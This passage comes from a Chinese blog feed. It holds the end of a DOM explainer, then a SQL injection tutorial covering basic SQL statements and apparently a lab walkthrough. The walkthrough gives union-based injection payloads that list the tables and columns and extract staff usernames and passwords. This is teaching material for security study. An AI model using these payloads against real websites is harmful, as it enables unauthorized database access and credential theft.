&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;这就像一个家庭的家谱：&amp;lt;html&amp;gt; 是爷爷，&amp;lt;head&amp;gt; 和 &amp;lt;body&amp;gt; 是他的两个孩子，&amp;lt;title&amp;gt; 是 &amp;lt;head&amp;gt; 的孩子，&amp;lt;h1&amp;gt; 和 &amp;lt;p&amp;gt; 是 &amp;lt;body&amp;gt; 的孩子。每个节点都是一个“对象”，有自己的属性，比如 &amp;lt;p&amp;gt; 的 innerHTML 属性就是“这是一个段落。”。
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;dom-有什么用&#34;&gt;DOM 有什么用？
&lt;/h2&gt;&lt;p&gt;DOM 的牛逼之处在于，它让 &lt;strong&gt;JavaScript&lt;/strong&gt; 能和网页互动。有了 DOM，JavaScript 就像一个装修工人，可以拿着网页的蓝图（DOM）去干活：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;查看&lt;/strong&gt;：找到某个节点，看看它是什么内容。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;修改&lt;/strong&gt;：比如把 &lt;code&gt;&amp;lt;p&amp;gt;&lt;/code&gt; 的文字从“这是一个段落。”改成“这是新段落！”。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;添加&lt;/strong&gt;：在 &lt;code&gt;&amp;lt;body&amp;gt;&lt;/code&gt; 里加一个新的 &lt;code&gt;&amp;lt;p&amp;gt;&lt;/code&gt; 节点。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;删除&lt;/strong&gt;：把某个节点去掉。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;举个例子：你想做一个网页，用户点一个按钮，页面上的文字就变了。你可以用 JavaScript 写代码，通过 DOM 找到那个文字所在的节点，然后改它的内容。比如：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;找到 &amp;lt;p&amp;gt; 节点 let paragraph = document.querySelector(&amp;#34;p&amp;#34;); // 修改它的内容 paragraph.innerHTML = &amp;#34;文字被我改啦！&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;再比如，你想做一个待办事项列表，用户点按钮就能添加新任务。这也是通过 DOM 实现的：JavaScript 创建一个新节点（比如 &lt;code&gt;&amp;lt;li&amp;gt;&lt;/code&gt;），然后把它加到列表里。&lt;/p&gt;
&lt;h2 id=&#34;dom-是桥梁&#34;&gt;DOM 是桥梁
&lt;/h2&gt;&lt;p&gt;所以，DOM 就像是网页（HTML）和 JavaScript 之间的“翻译官”或者“桥梁”。HTML 负责写出网页的内容和结构，DOM 把这些内容变成一个树形结构，JavaScript 通过 DOM 来动态地控制网页，让网页不再是静态的，而是可以互动、有变化的。&lt;/p&gt;
&lt;h2 id=&#34;小结&#34;&gt;小结
&lt;/h2&gt;&lt;p&gt;用最简单的话说：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;DOM 是网页的树形蓝图&lt;/strong&gt;，把每个元素都变成节点。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;JavaScript 通过 DOM 操作网页&lt;/strong&gt;，可以改内容、加东西、删东西。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;它让网页变得活起来&lt;/strong&gt;，能根据用户的操作动态变化。&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>SQL注入基础</title>
        <link>https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</link>
        <pubDate>Tue, 18 Mar 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</guid>
        <description>&lt;img src="https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/b700481cd7430f01667bb498798f40d218f0b35bb085b3ffa989e042ad5542a1.png" alt="Featured image of post SQL注入基础" /&gt;&lt;h1 id=&#34;sql注入&#34;&gt;SQL注入
&lt;/h1&gt;&lt;p&gt;SQL 语法不区分大小写。&lt;/p&gt;
&lt;h2 id=&#34;sql基础&#34;&gt;SQL基础
&lt;/h2&gt;&lt;h3 id=&#34;select&#34;&gt;SELECT
&lt;/h3&gt;&lt;p&gt;我们将学习的第一种查询类型是用于从数据库中检索数据的 SELECT 查询。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select * from users;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160026857.png&#34;
	width=&#34;1382&#34;
	height=&#34;186&#34;
	srcset=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160026857_hu_a1c29357c8e6bc5f.png 480w, https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160026857_hu_1836b73164289f9f.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;743&#34;
		data-flex-basis=&#34;1783px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;第一个单词 SELECT 告诉数据库我们想要检索一些数据;* 告诉数据库我们想从表中接收所有列。例如，该表可能包含三列（id、username 和 password）。“from users” 告诉数据库我们想要从名为 users 的表中检索数据。最后，末尾的分号告诉数据库这是查询的结束。&lt;/p&gt;
&lt;p&gt;下一个查询与上述查询类似，但这次，我们不是使用 * 返回数据库表中的所有列，而是只请求 username 和 password 字段。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select username,password from users;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160107670.png&#34;
	width=&#34;1387&#34;
	height=&#34;195&#34;
	srcset=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160107670_hu_8e6c560654a76494.png 480w, https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160107670_hu_2884f3b1ad65f1ab.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;711&#34;
		data-flex-basis=&#34;1707px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;与第一个查询一样，以下查询使用 * 选择器返回所有列，然后 “LIMIT 1” 子句强制数据库仅返回一行数据。将查询更改为 “LIMIT 1,1” 会强制查询跳过第一个结果，然后 “LIMIT 2,1” 会跳过前两个结果，依此类推。您需要记住，第一个数字告诉数据库您希望跳过多少个结果，第二个数字告诉数据库要返回多少行。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select * from users LIMIT 1;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160133299.png&#34;
	width=&#34;1387&#34;
	height=&#34;100&#34;
	srcset=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160133299_hu_2e8a28dd945dc7a0.png 480w, https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160133299_hu_116e6924d7b069e9.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;1387&#34;
		data-flex-basis=&#34;3328px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select * from users where username=&#39;admin&#39;;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160158890.png&#34;
	width=&#34;1385&#34;
	height=&#34;98&#34;
	srcset=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160158890_hu_cbc520106eb212d6.png 480w, https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160158890_hu_5907f8e5e5f3a511.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;1413&#34;
		data-flex-basis=&#34;3391px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;这只会返回 username 等于 admin 的行。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select * from users where username != &#39;admin&#39;;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160228981.png&#34;
	width=&#34;1381&#34;
	height=&#34;145&#34;
	srcset=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160228981_hu_d99e773ab83e0c8f.png 480w, https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160228981_hu_38ec2d446e10dac6.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;952&#34;
		data-flex-basis=&#34;2285px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;这只会返回 username &lt;strong&gt;不&lt;/strong&gt; 等于 admin 的行。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select * from users where username=&#39;admin&#39; or username=&#39;jon&#39;;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160256822.png&#34;
	width=&#34;1385&#34;
	height=&#34;145&#34;
	srcset=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160256822_hu_8fd58c4ebab6419d.png 480w, https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160256822_hu_5fdf7827852d7790.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;955&#34;
		data-flex-basis=&#34;2292px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;这只会返回用户名等于 admin 或 jon 的行。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select * from users where username=&#39;admin&#39; and password=&#39;p4ssword&#39;;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160336441.png&#34;
	width=&#34;1393&#34;
	height=&#34;97&#34;
	srcset=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160336441_hu_acc32e764ee4417c.png 480w, https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160336441_hu_c221c732b46efd62.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;1436&#34;
		data-flex-basis=&#34;3446px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;这只会返回用户名等于 &lt;strong&gt;admin&lt;/strong&gt; 且密码等于 &lt;strong&gt;p4ssword&lt;/strong&gt; 的行.&lt;/p&gt;
&lt;h4 id=&#34;like&#34;&gt;like
&lt;/h4&gt;&lt;p&gt;使用 like 子句允许您指定不完全匹配，而是以特定字符开头、包含或结尾的数据，方法是选择放置由百分号表示的通配符的位置。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select * from users where username like &#39;%n&#39;;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160440356.png&#34;
	width=&#34;1387&#34;
	height=&#34;190&#34;
	srcset=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160440356_hu_78ff5acf0bd4b1a9.png 480w, https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160440356_hu_8c94b8e109fd0298.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;730&#34;
		data-flex-basis=&#34;1752px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;这将返回用户名以字母 n 结尾的任何行。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;select * from users where username like &#39;%mi%&#39;;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160504321.png&#34;
	width=&#34;1386&#34;
	height=&#34;94&#34;
	srcset=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160504321_hu_98281a8adc3aeea6.png 480w, https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160504321_hu_4fed7ff6c4e6fca9.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;1474&#34;
		data-flex-basis=&#34;3538px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;这将返回用户名中包含字符 &lt;strong&gt;mi&lt;/strong&gt; 的任何行。&lt;/p&gt;
&lt;h3 id=&#34;union&#34;&gt;UNION
&lt;/h3&gt;&lt;p&gt;UNION 语句将两个或多个 SELECT 语句的结果组合在一起，以从单个或多个表中检索数据;此查询的规则是 UNION 语句必须在每个 SELECT 语句中检索相同数量的列，列必须具有相似的数据类型，并且列顺序必须相同。这听起来可能不是很清楚，所以让我们使用下面的类比。假设一家公司想要为所有客户和供应商创建一个地址列表，以便发布新目录。我们有一个名为 customers 的表，其中包含以下内容：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160608318.png&#34;
	width=&#34;1389&#34;
	height=&#34;189&#34;
	srcset=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160608318_hu_428dd879d21792b8.png 480w, https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160608318_hu_835186d4a4ba9826.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;734&#34;
		data-flex-basis=&#34;1763px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;另一个表叫 suppliers，内容如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160630628.png&#34;
	width=&#34;1382&#34;
	height=&#34;233&#34;
	srcset=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160630628_hu_2dddac8afab7b28b.png 480w, https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160630628_hu_f103617d46af75ac.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;593&#34;
		data-flex-basis=&#34;1423px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;使用以下 SQL 语句，我们可以从两个表中收集结果并将它们放入一个结果集中：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160656676.png&#34;
	width=&#34;1382&#34;
	height=&#34;370&#34;
	srcset=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160656676_hu_996141177df5d8b5.png 480w, https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160656676_hu_27912512623d2.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;373&#34;
		data-flex-basis=&#34;896px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;insert&#34;&gt;INSERT
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;INSERT&lt;/strong&gt; 语句告诉数据库我们希望在表中插入一行新数据。 &lt;strong&gt;“into users”&lt;/strong&gt; 告诉数据库我们希望将数据插入到哪个表中， &lt;strong&gt;“（username，password）”&lt;/strong&gt; 提供我们提供数据的列，然后 &lt;strong&gt;“values （&amp;lsquo;bob&amp;rsquo;，&amp;lsquo;password&amp;rsquo;）”;&lt;/strong&gt; 提供以前指定的列的数据。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;insert into users (username,password) values (&#39;bob&#39;,&#39;password123&#39;);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160737067.png&#34;
	width=&#34;1387&#34;
	height=&#34;237&#34;
	srcset=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160737067_hu_2299b42a7593e509.png 480w, https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160737067_hu_d5aafc4a61edec3c.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;585&#34;
		data-flex-basis=&#34;1404px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;update&#34;&gt;UPDATE
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;UPDATE&lt;/strong&gt; 语句告诉数据库我们希望更新表中的一行或多行数据。您使用 “&lt;strong&gt;update %tablename% SET&lt;/strong&gt;” 指定要更新的表，然后选择要更新的一个或多个字段，以逗号分隔的列表，例如 “&lt;strong&gt;username=&amp;lsquo;root&amp;rsquo;，password=&amp;lsquo;pass123&amp;rsquo;&lt;/strong&gt;”，最后，类似于 SELECT 语句，您可以使用 where 子句准确指定要更新的行，例如 “&lt;strong&gt;where username=&amp;lsquo;admin;&lt;/strong&gt;“&lt;/p&gt;
&lt;p&gt;&lt;code&gt;update users SET username=&#39;root&#39;,password=&#39;pass123&#39; where username=&#39;admin&#39;;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160817369.png&#34;
	width=&#34;1385&#34;
	height=&#34;239&#34;
	srcset=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160817369_hu_1a146b842164f37c.png 480w, https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160817369_hu_1feee62a670e3ff5.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;579&#34;
		data-flex-basis=&#34;1390px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;delete&#34;&gt;DELETE
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;DELETE&lt;/strong&gt; 语句告诉数据库我们希望删除一行或多行数据。除了缺少要返回的列之外，此查询的格式与 SELECT 非常相似。您可以使用 &lt;strong&gt;where&lt;/strong&gt; &lt;strong&gt;子句精确&lt;/strong&gt;指定要删除的数据，并使用 LIMIT 子句指定要删除的行 数。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;delete from users where username=&#39;martin&#39;;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160846187.png&#34;
	width=&#34;1385&#34;
	height=&#34;187&#34;
	srcset=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160846187_hu_cda7583a378e4286.png 480w, https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160846187_hu_5d14e1a6f115937a.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;740&#34;
		data-flex-basis=&#34;1777px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;delete from users;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;由于查询中未使用 WHERE 子句，因此所有数据都已从表中删除。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160925268.png&#34;
	width=&#34;1388&#34;
	height=&#34;51&#34;
	srcset=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160925268_hu_b04a9760ff2ede6d.png 480w, https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318160925268_hu_22142de98776489a.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;2721&#34;
		data-flex-basis=&#34;6531px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;基础做题&#34;&gt;基础做题
&lt;/h2&gt;&lt;h3 id=&#34;in-band-sql-injection&#34;&gt;In-Band SQL Injection
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318163151079.png&#34;
	width=&#34;717&#34;
	height=&#34;472&#34;
	srcset=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318163151079_hu_8d3e3435a4a000b4.png 480w, https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318163151079_hu_b2aef2d982353cbd.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;151&#34;
		data-flex-basis=&#34;364px&#34;
	
&gt;&lt;/p&gt;
&lt;h4 id=&#34;查询库&#34;&gt;查询库
&lt;/h4&gt;&lt;p&gt;利用union查询的原理，先确定回显的位置。&lt;/p&gt;
&lt;p&gt;构建 &lt;code&gt;0 UNION SELECT 1,2,3&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;可以看到页面情况，有三个回显位置&lt;/p&gt;
&lt;p&gt;构建 &lt;code&gt;0 UNION SELECT 1,2,database()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318162957019.png&#34;
	width=&#34;714&#34;
	height=&#34;174&#34;
	srcset=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318162957019_hu_3d1600a4711191ff.png 480w, https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318162957019_hu_349fabb68713c43f.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;410&#34;
		data-flex-basis=&#34;984px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;可以知道database的名字：sqli_one&lt;/p&gt;
&lt;h4 id=&#34;查询表&#34;&gt;查询表
&lt;/h4&gt;&lt;p&gt;构建 &lt;code&gt;0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = &#39;sqli_one&#39;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在此查询中，需要学习一些新内容。首先，方法 &lt;strong&gt;group_concat（）&lt;/strong&gt; 从多个返回的行中获取指定的列（在我们的例子中为 table_name），并将其放入一个以逗号分隔的字符串中。接下来是 &lt;strong&gt;information_schema&lt;/strong&gt; 数据库;数据库的每个用户都可以访问它，它包含有关该用户有权访问的所有数据库和表的信息。在这个特定的查询中，我们有兴趣列出 sqli_one 数据库中的所有 表，即 article 和 staff_users。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318163513022.png&#34;
	width=&#34;708&#34;
	height=&#34;256&#34;
	srcset=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318163513022_hu_52b29624e6f26a28.png 480w, https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318163513022_hu_af4d549d5f8f86d3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;276&#34;
		data-flex-basis=&#34;663px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;由于第一级旨在发现 Martin 的密码，因此 staff_users 表是我们感兴趣的。我们可以再次利用 information_schema 数据库，通过以下查询找到此表的结构。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = &#39;staff_users&#39;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318163803767.png&#34;
	width=&#34;713&#34;
	height=&#34;236&#34;
	srcset=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318163803767_hu_536c84167fe6733d.png 480w, https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318163803767_hu_93e72086ea704fa0.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;302&#34;
		data-flex-basis=&#34;725px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;这与前面的 SQL 查询类似。但是，我们要检索的信息已从 table_name 更改为 &lt;strong&gt;column_name&lt;/strong&gt;，我们在 information_schema 数据库中查询的表已从 tables 更改为 &lt;strong&gt;columns&lt;/strong&gt;，并且我们正在搜索 table_name 列值为 staff_users 的任何行&lt;/p&gt;
&lt;p&gt;查询结果为 staff_users 表提供三列：id、password 和 username。我们可以使用以下查询的 username 和 password 列来检索用户的信息。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;0 UNION SELECT 1,2,group_concat(username,&#39;:&#39;,password SEPARATOR &#39;&amp;lt;br&amp;gt;&#39;) FROM staff_users&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;同样，我们使用 group_concat 方法将所有行返回到一个字符串中，使其 更易于阅读。我们还添加了 &lt;strong&gt;，&amp;rsquo;：&amp;rsquo;，&lt;/strong&gt; 以将用户名和密码彼此分开。我们没有用逗号分隔，而是选择了 &lt;code&gt;HTML &amp;lt;br&amp;gt;&lt;/code&gt; 标签，该标签强制每个结果位于单独的行上，以便于阅读。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/image-20250318164023522.png&#34;
	width=&#34;716&#34;
	height=&#34;274&#34;
